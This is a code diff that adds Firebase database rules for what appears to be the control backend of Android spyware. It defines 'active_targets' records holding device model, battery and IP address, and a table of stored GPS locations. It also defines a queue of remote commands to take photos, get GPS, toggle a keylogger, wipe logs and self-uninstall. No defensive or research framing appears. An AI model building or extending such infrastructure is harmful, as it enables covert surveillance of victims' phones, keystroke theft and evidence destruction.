@@ -1,0 +1,63 @@
+{
+  "rules": {
+    ".read": "root.child('admin_uid').val() === auth.uid",
+    ".write": "root.child('admin_uid').val() === auth.uid",
+    "admin_uid": {
+      ".read": true,
+      ".write": false
+    },
+    "kei-vault": {
+      ".read": "root.child('admin_uid').val() === auth.uid",
+      ".write": "root.child('admin_uid').val() === auth.uid",
+      "active_targets": {
+        "$deviceId": {
+          ".validate": "newData.hasChildren(['id', 'model', 'android_version', 'battery', 'ip_address'])",
+          "id": { ".validate": "newData.isString()" },
+          "model": { ".validate": "newData.isString()" },
+          "android_version": { ".validate": "newData.isString()" },
+          "battery": { ".validate": "newData.isNumber() && newData.val() >= 0 && newData.val() <= 100" },
+          "ip_address": { ".validate": "newData.isString()" },
+          "status": { ".validate": "newData.val() === 'active' || newData.val() === 'offline'" },
+          "last_ping": { ".validate": "newData.isNumber()" }
+        }
+      },
+      "commands": {
+        "$deviceId": {
+          "$commandId": {
+            ".validate": "newData.hasChildren(['action', 'timestamp'])",
+            "action": { ".validate": "newData.val() === 'take_photo' || newData.val() === 'get_gps' || newData.val() === 'wipe_logs' || newData.val() === 'toggle_keylog' || newData.val() === 'self_uninstall'" },
+            "timestamp": { ".validate": "newData.isNumber()" },
+            "status": { ".validate": "newData.val() === 'pending' || newData.val() === 'executed' || newData.val() === 'failed'" }
+          }
+        }
+      },
+      "device_locations": {
+        "$deviceId": {
+          ".validate": "newData.hasChildren(['lat', 'lng', 'timestamp'])",
+          "lat": { ".validate": "newData.isNumber()" },
+          "lng": { ".validate": "newData.isNumber()" },
+          "timestamp": { ".validate": "newData.isNumber()" },
+          "accuracy": { ".validate": "newData.isNumber()" }
+        }
+      },
+      "activity_logs": {
+        "$logId": {
+          ".validate": "newData.hasChildren(['message', 'timestamp', 'device_id'])",
+          "message": { ".validate": "newData.isString()" },
+          "timestamp": { ".validate": "newData.isNumber()" },
+          "device_id": { ".validate": "newData.isString()" },
+          "type": { ".validate": "newData.val() === 'info' || newData.val() === 'warning' || newData.val() === 'error' || newData.val() === 'success'" }
+        }
+      },
+      "system_logs": {
+        "$logId": {
+          ".validate": "newData.hasChildren(['message', 'timestamp'])",
+          "message": { ".validate": "newData.isString()" },
+          "timestamp": { ".validate": "newData.isNumber()" },
+          "type": { ".validate": "newData.val() === 'info' || newData.val() === 'warning' || newData.val() === 'error'" },
+          "device_id": { ".validate": "newData.isString() || !newData.exists()" }
+        }
+      }
+    }
+  }
+}
